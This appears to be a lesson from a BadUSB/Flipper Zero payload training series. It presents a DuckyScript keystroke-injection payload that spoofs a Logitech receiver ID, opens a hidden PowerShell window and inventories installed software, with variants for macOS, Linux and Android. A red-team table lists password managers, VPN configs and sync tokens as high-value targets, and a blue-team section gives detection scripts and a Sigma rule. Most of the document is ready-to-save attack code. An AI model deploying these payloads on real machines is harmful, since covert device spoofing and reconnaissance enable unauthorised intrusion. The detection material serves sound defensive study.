# FZ-I15: Installed Software Inventory

## Overview

| Property | Value |
|----------|-------|
| **ID** | FZ-I15 |
| **Name** | Installed Software Inventory |
| **Difficulty** | Intermediate |
| **Target OS** | Windows 10/11 |
| **Execution Time** | ~8 seconds |
| **Output** | %TEMP%\software.txt |
| **MITRE ATT&CK** | T1518 (Software Discovery) |

## What This Payload Does

Creates a complete inventory of installed software on the target system. This information reveals potential vulnerabilities (outdated software), security tools, development environments, and user activities.

---

## The Payload

```ducky
REM =============================================
REM INTERMEDIATE: Installed Software Inventory
REM Target: Windows 10/11
REM Action: Lists all installed software
REM Output: %TEMP%\software.txt
REM Skill: Intermediate
REM =============================================

ID 046d:c52b Logitech:Unifying Receiver

DELAY 2500

REM Open hidden PowerShell
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500

REM Enumerate installed software
STRINGLN $sw = @()
STRINGLN $sw += "=== INSTALLED SOFTWARE ==="
STRINGLN $sw += "Generated: $(Get-Date)"
STRINGLN $sw += ""

REM 64-bit applications
STRINGLN $sw += "=== 64-BIT APPLICATIONS ==="
STRINGLN $sw += (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, Publisher, InstallDate | Sort DisplayName | Format-Table -AutoSize | Out-String -Width 200)

REM 32-bit applications
STRINGLN $sw += "=== 32-BIT APPLICATIONS ==="
STRINGLN $sw += (Get-ItemProperty HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, Publisher, InstallDate | Sort DisplayName | Format-Table -AutoSize | Out-String -Width 200)

REM User-installed applications
STRINGLN $sw += "=== USER APPLICATIONS ==="
STRINGLN $sw += (Get-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion | Sort DisplayName | Format-Table -AutoSize | Out-String -Width 200)

STRINGLN $sw | Out-File "$env:TEMP\software.txt"
STRINGLN exit
```

---

## Software Categories of Interest

### Security Software

| Type | Examples |
|------|----------|
| Antivirus | Windows Defender, Norton, Kaspersky, Avast |
| EDR | CrowdStrike, Carbon Black, SentinelOne |
| Firewall | ZoneAlarm, Comodo, GlassWire |
| Password Managers | LastPass, 1Password, Bitwarden, KeePass |
| VPN | NordVPN, ExpressVPN, Cisco AnyConnect |

### Development Tools

| Type | Examples |
|------|----------|
| IDEs | Visual Studio, VS Code, JetBrains |
| Runtimes | Python, Node.js, Java, .NET |
| Databases | SQL Server, MySQL, PostgreSQL |
| Containers | Docker, Podman |
| Version Control | Git, GitHub Desktop, GitKraken |

### Vulnerable Software

| Software | Known Issues |
|----------|--------------|
| Adobe Flash | EOL, many CVEs |
| Java (old) | Frequent vulnerabilities |
| WinRAR (old) | ACE vulnerability |
| 7-Zip (old) | Memory corruption bugs |
| Old browsers | Numerous CVEs |

---

## Cross-Platform Versions

### macOS

```ducky
DELAY 2500
GUI SPACE
DELAY 700
STRING terminal
ENTER
DELAY 1500
STRINGLN echo "=== INSTALLED APPLICATIONS ===" > /tmp/software.txt
STRINGLN echo "Generated: $(date)" >> /tmp/software.txt
STRINGLN echo "" >> /tmp/software.txt

STRINGLN echo "=== APPLICATIONS ===" >> /tmp/software.txt
STRINGLN ls -la /Applications >> /tmp/software.txt

STRINGLN echo "" >> /tmp/software.txt
STRINGLN echo "=== HOMEBREW PACKAGES ===" >> /tmp/software.txt
STRINGLN brew list 2>/dev/null >> /tmp/software.txt

STRINGLN echo "" >> /tmp/software.txt
STRINGLN echo "=== INSTALLED PKGS ===" >> /tmp/software.txt
STRINGLN pkgutil --pkgs 2>/dev/null | head -50 >> /tmp/software.txt
```

### Linux

```ducky
DELAY 2500
CTRL ALT t
DELAY 1000
STRINGLN echo "=== INSTALLED SOFTWARE ===" > /tmp/software.txt
STRINGLN echo "Generated: $(date)" >> /tmp/software.txt
STRINGLN echo "" >> /tmp/software.txt

REM Debian/Ubuntu
STRINGLN echo "=== APT PACKAGES ===" >> /tmp/software.txt
STRINGLN dpkg -l 2>/dev/null | head -100 >> /tmp/software.txt

REM RHEL/Fedora
STRINGLN echo "" >> /tmp/software.txt
STRINGLN echo "=== RPM PACKAGES ===" >> /tmp/software.txt
STRINGLN rpm -qa 2>/dev/null | head -100 >> /tmp/software.txt

REM Snap packages
STRINGLN echo "" >> /tmp/software.txt
STRINGLN echo "=== SNAP PACKAGES ===" >> /tmp/software.txt
STRINGLN snap list 2>/dev/null >> /tmp/software.txt

REM Flatpak
STRINGLN echo "" >> /tmp/software.txt
STRINGLN echo "=== FLATPAK ===" >> /tmp/software.txt
STRINGLN flatpak list 2>/dev/null >> /tmp/software.txt
```

### Android (via Termux)

```ducky
DELAY 4000
GUI
DELAY 1000
STRING termux
ENTER
DELAY 3000
STRINGLN echo "=== INSTALLED APPS ===" > /sdcard/software.txt
STRINGLN echo "Generated: $(date)" >> /sdcard/software.txt
STRINGLN echo "" >> /sdcard/software.txt

REM User-installed apps
STRINGLN echo "=== USER APPS ===" >> /sdcard/software.txt
STRINGLN pm list packages -3 >> /sdcard/software.txt

REM System apps
STRINGLN echo "" >> /sdcard/software.txt
STRINGLN echo "=== SYSTEM APPS ===" >> /sdcard/software.txt
STRINGLN pm list packages -s | head -50 >> /sdcard/software.txt

REM Package versions (requires more permissions)
STRINGLN echo "" >> /sdcard/software.txt
STRINGLN echo "=== APP VERSIONS ===" >> /sdcard/software.txt
STRINGLN dumpsys package packages 2>/dev/null | grep -E 'Package \[|versionName' | head -100 >> /sdcard/software.txt
```

### iOS

iOS app enumeration is not possible via BadUSB due to sandbox restrictions.

---

## Additional Inventory Queries

### Windows Store Apps

```powershell
Get-AppxPackage | Select Name, Version, Publisher |
    Sort Name | Format-Table -AutoSize
```

### Browser Extensions

```powershell
# Chrome extensions
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Extensions" |
    ForEach-Object { Get-Content "$($_.FullName)\*\manifest.json" -ErrorAction SilentlyContinue |
    ConvertFrom-Json | Select name, version }

# Edge extensions
Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions" |
    ForEach-Object { Get-Content "$($_.FullName)\*\manifest.json" -ErrorAction SilentlyContinue |
    ConvertFrom-Json | Select name, version }
```

### Installed Windows Features

```powershell
Get-WindowsOptionalFeature -Online | Where-Object {$_.State -eq 'Enabled'} |
    Select FeatureName
```

### Services

```powershell
Get-Service | Where-Object {$_.Status -eq 'Running'} |
    Select Name, DisplayName, StartType
```

---

## Red Team Perspective

### Vulnerability Identification

1. **Check software versions against CVE databases**
2. **Identify outdated software**
3. **Look for development tools (may have stored credentials)**
4. **Find security software for evasion planning**

### High-Value Targets

| Software Type | Why Valuable |
|---------------|--------------|
| Password Managers | Credential storage |
| VPN Clients | Config files, certs |
| Git Clients | Repository access |
| Database Tools | Connection strings |
| Email Clients | Cached credentials |
| Cloud Storage | Sync tokens |

### Attack Chain

```
Software Inventory → Vulnerability Research → Exploit Selection → Exploitation
         ↑
     You are here
```

---

## Blue Team Perspective

### Detection Opportunities

1. **Registry Queries**
   - Access to Uninstall keys
   - Mass registry enumeration

2. **WMI Queries**
   - Win32_Product queries
   - Software inventory requests

3. **PowerShell Logging**
   - Get-ItemProperty on software keys
   - Get-AppxPackage commands

### Detection Script

```powershell
# Monitor for software enumeration
Get-WinEvent -FilterHashtable @{
    LogName='Microsoft-Windows-PowerShell/Operational'
    Id=4104
} -MaxEvents 200 | Where-Object {
    $_.Message -match 'Uninstall|Win32_Product|Get-AppxPackage|DisplayName.*DisplayVersion'
} | Select TimeCreated, @{N='Script';E={$_.Message.Substring(0,300)}}
```

### Sigma Rule

```yaml
title: Software Discovery Activity
status: experimental
description: Detects enumeration of installed software
logsource:
    product: windows
    category: ps_script
detection:
    selection_registry:
        ScriptBlockText|contains:
            - 'CurrentVersion\Uninstall'
            - 'WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
    selection_cmdlet:
        ScriptBlockText|contains:
            - 'Get-AppxPackage'
            - 'Win32_Product'
    condition: selection_registry or selection_cmdlet
level: low
tags:
    - attack.discovery
    - attack.t1518
```

### Prevention

1. **Patch Management**
   - Keep software updated
   - Remove unused software

2. **Software Inventory**
   - Maintain approved software list
   - Regular audits

3. **Application Whitelisting**
   - Only approved software runs
   - Block unauthorized installations

---

## Practice Exercises

### Exercise 1: Count Installed Software
```ducky
STRINGLN (Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*).Count
```

### Exercise 2: Find Specific Software
Check if specific software is installed:
```ducky
STRINGLN Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.DisplayName -match 'Chrome' }
```

### Exercise 3: Find Old Software
List software without recent updates:
```ducky
STRINGLN Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object { $_.InstallDate -lt "20230101" } | Select DisplayName, InstallDate
```

### Exercise 4: Export to CSV
```ducky
STRINGLN Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select DisplayName, DisplayVersion, Publisher | Export-Csv "$env:TEMP\software.csv" -NoTypeInformation
```

---

## Payload File

Save as `FZ-I15_Installed_Software.txt`:

```ducky
REM FZ-I15: Installed Software
ID 046d:c52b Logitech:Unifying Receiver
DELAY 2500
GUI r
DELAY 500
STRING powershell -w hidden
ENTER
DELAY 1500
STRINGLN "=== SOFTWARE ===$(Get-Date)`n$(Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*|Select DisplayName,DisplayVersion|Sort DisplayName|Out-String)"|Out-File "$env:TEMP\sw.txt";exit
```

---

## Intermediate Level Complete!

Congratulations on completing all Intermediate level payloads. You've learned:

| Skill | Payloads |
|-------|----------|
| System Reconnaissance | FZ-I01, FZ-I04, FZ-I05 |
| Credential Access | FZ-I02, FZ-I03, FZ-I08, FZ-I10 |
| Persistence | FZ-I06, FZ-I09, FZ-I13 |
| Remote Execution | FZ-I07 |
| Discovery | FZ-I14, FZ-I15 |
| Mobile Platforms | FZ-I11, FZ-I12 |

**Next:** [Advanced Level Scripts →](../04_Advanced_Scripts/)

---

[← FZ-I14 Process Enumeration](FZ-I14_Process_Enumeration.md) | [Back to Intermediate](README.md) | [Next: Advanced Scripts →](../04_Advanced_Scripts/)
